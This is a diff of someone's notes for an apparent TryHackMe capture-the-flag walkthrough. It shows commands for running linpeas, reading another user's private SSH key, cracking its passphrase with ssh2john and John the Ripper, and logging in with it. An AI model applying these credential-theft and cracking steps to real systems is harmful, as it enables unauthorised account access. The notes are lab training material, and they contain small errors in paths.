@@ -18,7 +18,7 @@ This is a machine that allows you to practise web app hacking and privilege esca
  https://youtu.be/xl2Xx5YOKcI?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=419
  
  
- Run  server:   openvpn  <name of ovpn.ovpn>
+ Run  server:   sudo openvpn  <name of ovpn.ovpn>
 
  ip:  10.10.43.220     #10.10.205.158
 1. ping    10.10.43.220
@@ -95,21 +95,55 @@ results:
   wget https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh
 
   copy from the local to remote with the next command :
-   scp ./linpeas.sh jan@10.10.141.152:/dev/shm 
-SCP, or Secure Copy Protocol,  used to securely transfer files between   between two remote systems. It uses SSH for encryption 
+     scp ./linpeas.sh jan@10.10.141.152:/dev/shm 
+SCP, (Secure Copy Protocol), transfer files between  between two remote systems. It uses SSH for encryption 
 
   cd  /dev/shm
   chmod +x linpeas.sh
   ./linpeas.sh | tee lilog.txt
-The output is a very long list
-At the middle we will find the next lines :
-   "Possible private SSH keys were found!
-   /home/kay/.ssh/id_rsa"
-   so 'kay' has a private key.
+  
+results:  the output is a very long list
+    At the middle we will find the next lines :
+   "Possible private SSH keys were found! /home/kay/.ssh/id_rsa"
+    so 'kay' has a private key.
+
+ 
 cd /home/kay/.ssh
 cat id_rsa   # output private key 
 
-10.10.141.152
+With the RSA key, we can directly access Kay’s account through an SSH connection without entering 
+a password.
+ copy the content of Kay’s RSA key to a local file named “a.txt” on our own terminal. 
+   
+   
+ With the RSA key, we can directly access Kay’s account through an SSH connection without entering 
+ a password. 
+ We save Kay’s RSA key to a file named “a.txt” on our own terminal.
+ When we attempt to connect to Kay’s account using the RSA key, 
+ we notice that the RSA key is also protected by a passphrase.   
+   
+   First, we need to crack this passphrase. For this purpose, we can use the 
+   “ssh2john” tool from “John the Ripper.” John the Ripper is a commonly used tool for password
+   cracking on Unix-based systems. Initially, the RSA key, together with ssh2john, 
+   will be transformed into a format that John the Ripper can crack. 
+   We save the output to a text file named “decrypted1.txt.” Then, we instruct John the Ripper
+   to attempt to crack the passphrase by providing the commonly used “rockyou.txt” wordlist. 
+
+chmod 600 a.txt
+ssh2john a.txt > decrypted1.txt
+run  John the Ripper to attempt to crack the passphrase by providing the commonly used 
+“rockyou.txt” wordlist.
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt  decrypted1.txt
+
+result:
+  beeswax          (a.txt)     
+  
+in 'kay' dir= /home/kat/.ssh   
+ run:  
+     ssh -i /home/kay/.ssh/id_rsa  kay@<host ip>         #10.10.170.185
+
+input the pass 'beeswax'
+10.10.170.185
 https://medium.com/@aycagl/basic-pentesting-walkthrough-tryhackme-f37a530bfce5
    
    https://youtu.be/xl2Xx5YOKcI?t=1514
